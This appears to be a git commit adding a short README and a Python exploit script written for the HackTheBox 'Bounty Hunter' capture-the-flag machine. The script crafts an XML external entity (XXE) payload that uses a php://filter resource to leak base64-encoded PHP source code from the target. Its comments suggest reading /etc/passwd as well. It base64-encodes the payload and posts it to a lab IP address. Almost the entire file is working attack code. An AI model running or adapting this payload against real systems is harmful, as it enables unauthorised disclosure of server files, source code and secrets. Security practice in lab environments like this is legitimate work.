3a9b13afb406da9e5dd0dc100f699b5fc48b8f41
Virus629 <30345683+Virus629@users.noreply.github.com>
2021-11-17 17:45:53 +0200

    Upload Files

---
+++ README.md
@@ -0,0 +1,2 @@
+<h1 align='center'>XMLHttpRequest python script</h1>
+<h3 align='center'>Made for HackTheBox Bounty Hunter CTF</h3>
---
+++ xmlhttprequest.py
@@ -0,0 +1,38 @@
+#!/usr/bin/env python3
+
+import requests
+import base64
+
+# File can be also for exmample "file:///etc/passwd"
+# PHP:// can expose server side source code
+FILE = 'php://filter/convert.base64-encode/resource=tracker_diRbPr00f314.php'
+
+TARGET_URL = "http://10.10.11.100/tracker_diRbPr00f314.php"
+
+TEMPLATE = f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{FILE}"> ]>
+\t\t<bugreport>
+\t\t<title>&xxe;</title>
+\t\t<cwe>CVE-2021-2021</cwe>
+\t\t<cvss>10.0</cvss>
+\t\t<reward>1000</reward>
+\t\t</bugreport>
+"""
+
+dataBytes = base64.b64encode(TEMPLATE.encode("utf-8"))
+dataStr = str(dataBytes, "utf-8")
+
+POST_DATA = {'data': dataStr}
+
+req = requests.post(
+    TARGET_URL,
+    data=POST_DATA,
+    headers={  # This maybe unnecesary
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Request-With": "XMLHttpRequest"
+    },
+)
+
+# Debug
+print(f'[*] Sending BASE64 string: {dataStr}\n')
+print(req.text)
